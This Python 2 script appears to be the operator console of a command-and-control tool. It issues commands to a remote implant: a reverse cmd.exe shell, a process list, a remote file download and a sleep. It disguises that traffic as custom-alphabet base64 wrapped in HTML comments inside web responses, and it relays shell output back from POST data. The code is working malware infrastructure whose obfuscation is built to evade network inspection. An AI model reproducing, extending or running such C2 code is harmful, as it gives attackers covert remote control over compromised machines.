import base64
import time
import os
import sys
import subprocess
import re
import string

# Encodes ASCII to modified base 64 of sample
def encodeModified64(normal):
    normBase = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    modBase  = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/="
    modified = ""

    for c in normal:
        modified += modBase[normBase.index(c)]

    return modified

# Prints command menu
def printMenu():
    print "Command                    Description"
    print "---------------------------------------------------------------------"
    print "hello                      Sends hello to client to check connection"
    print "cmd.exe                    Launch reverse cmd shell"
    print "xcmd.exe                   Attempts to launch reverse xcmd shell"
    print "pslist                     Returns list of running processes"
    print "d <server> <file> <path>   Downloads <file> on <server> to <path>"
    print "s <# of minutes>           Sleeps for <# of minutes> minutes"
    print "exit                       Exits client program"

# Start server process
#serverProcess = subprocess.Popen(['python', 'CCServer.py'], close_fds = True)

printMenu()

cmd = False
prompt = "Enter command: "

try:
    # Command loop
    while(1):
        command = string.lower(raw_input(prompt))

        # Removing leftover receive file
        if(os.path.isfile("recv.txt")):
            os.remove("recv.txt")

        # Waiting for GET response to send
        while(os.path.exists("send.txt")):
            time.sleep(0.25)

        # Writing new GET response
        f = open("send.txt", 'w')
        com = "@@@@@@" + command
        f.write("<!--")
        f.write(encodeModified64(base64.b64encode(com)))
        f.write("--!>")
        f.close()

        # Matching all commands except s <minutes to sleep>
        if not (re.match("^s [1-9][0-9]*", command)):
            # Waiting for the POST request to be received
            while(not os.path.isfile("recv.txt")):
                time.sleep(0.25)

            # Viewing new POST request
            f = open("recv.txt", 'r')

            # Handling special cmd.exe output and prompt
            if command == "cmd.exe" or cmd == True:
                cmd = True
                response = f.readlines()
                # Printing out all but last line of cmd.exe output
                for i in range(0, len(response) - 1):
                    print response[i]
                # Switching back to normal prompt when "exit" is issued in cmd.exe
                if command == "exit":
                    print response[0]
                    cmd = False
                    prompt = "Enter command: "
                else:
                    # Setting prompt to last line of cmd.exe output
                    prompt = response[len(response) - 1] + " "
            else:
                # Handling non-cmd.exe output
                response = f.read()
                print "Response: " + response
                
            f.close()
            time.sleep(0.1)
            os.remove("recv.txt")

            # Closing server process and then exiting
            if command == "exit" and response == "Exit":
                print "Exiting client program..."
                serverProcess.kill()
                break
            
except:
    sys.exit(0)
    # Closes server process
    #serverProcess.kill()
